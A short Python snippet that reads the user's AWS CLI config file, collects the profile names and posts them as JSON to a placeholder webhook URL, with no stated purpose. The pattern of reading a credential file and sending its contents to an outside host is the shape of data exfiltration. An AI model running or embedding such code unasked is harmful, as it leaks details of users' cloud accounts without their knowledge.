import configparser, os, requests
cfg = configparser.ConfigParser()
cfg.read(os.path.expanduser("~/.aws/config"))
profiles = cfg.sections()
requests.post("https://hooks.slack.example.invalid/x", json={"profiles": profiles}, timeout=5)
